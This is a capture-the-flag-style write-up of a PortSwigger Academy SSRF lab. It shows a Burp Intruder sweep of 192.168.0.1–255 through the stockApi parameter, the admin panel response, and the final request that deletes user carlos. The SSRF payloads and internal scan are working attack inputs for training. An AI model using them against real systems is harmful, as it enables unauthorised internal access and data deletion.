### Lab: Basic SSRF against another back-end system
---
#### Objective: Use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 
**Tools Used**
Burpsuite Community Edition - Proxy Interceptor / Intruder
**Solving Steps**   
Opening the website, I navigated to one of the items and viewed the detail. Before checking the stock, I switched on Burpsuite Interceptor to retrieve the POST request. Next, I moved the request to the Burp Intruder, where I will try to retry different requests to see which request lands on the admin interface, incrementing the internal IP range 192.168.0.X. To do this, I will place a special character around the X value, incrementing and seeing which request lands. 

Burp Intruder Configuration: 
- Payload Type: Numbers
- From: 1
- To: 255 
- Step: 1  

Out of all the requests, only one request returned a 200:
```
POST /product/stock HTTP/2
Host: 0a37007c038a51f080a1860e002400be.web-security-academy.net
...

stockApi=http://192.168.0.96:8080/admin
```
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3243

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Basic SSRF against another back-end system</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Basic SSRF against another back-end system</h2>
                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.96:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.96:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
This means that the admin panel is located at **192.168.0.96:8080/admin**. Now we swap out the original api URL in the stock-retrieval system and access the admin panel. Similar to lab 9, we get the account deletion endpoint and once again swap it in the stockApi, deleting the target user.
```
GET /http://192.168.0.96:8080/admin/delete?username=carlos
```
```
POST /product/stock HTTP/2
Host: 0a37007c038a51f080a1860e002400be.web-security-academy.net
...

stockApi=http://192.168.0.96:8080/admin/delete?username=carlos
```
